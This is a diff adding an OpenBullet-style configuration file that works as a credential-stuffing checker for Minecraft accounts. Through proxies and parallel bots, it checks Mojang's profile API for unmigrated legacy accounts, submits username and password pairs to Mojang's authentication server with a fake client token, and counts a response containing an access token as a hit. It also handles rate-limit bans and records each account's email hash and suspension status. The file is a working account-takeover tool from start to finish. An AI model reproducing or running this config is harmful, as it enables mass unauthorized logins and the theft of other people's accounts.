@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "MinecraftNotMigrated",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-27T00:53:20.0842077+01:00",
+  "AdditionalInfo": "",
+  "Author": "agilityseven",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#ISMIGRATED REQUEST POST "https://api.mojang.com/profiles/minecraft" 
+  CONTENT "[\"<USERNAME>\"]" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "legacy\":true" 
+  KEYCHAIN Failure OR 
+    KEY "[]" 
+    KEY "legacy\":false" 
+  KEYCHAIN Failure AND 
+    KEY "id" 
+    KEY "<SOURCE>" DoesNotContain "legacy" 
+  KEYCHAIN Ban OR 
+    KEY "The client has sent too many requests within a certain amount of time" 
+
+FUNCTION Hash MD5 "<USERNAME>" -> VAR "FAKETOKEN" 
+
+#AUTH REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"agent\":{\"name\": \"Minecraft\", \"version\": \"1\"}, \"clientToken\": \"<FAKETOKEN>\",\"password\": \"<PASSWORD>\",\"requestUser\": \"true\", \"username\": \"<USERNAME>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: MinecraftLauncher/1.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorMessage\":\"Invalid credentials. Invalid username or password." 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+    KEY "passwordChangedAt" 
+
+#MAILHASH PARSE "<SOURCE>" JSON "email" -> CAP "E-Mail Hash" 
+
+#SUSPENDED PARSE "<SOURCE>" JSON "suspended" -> CAP "isSuspended" 
+
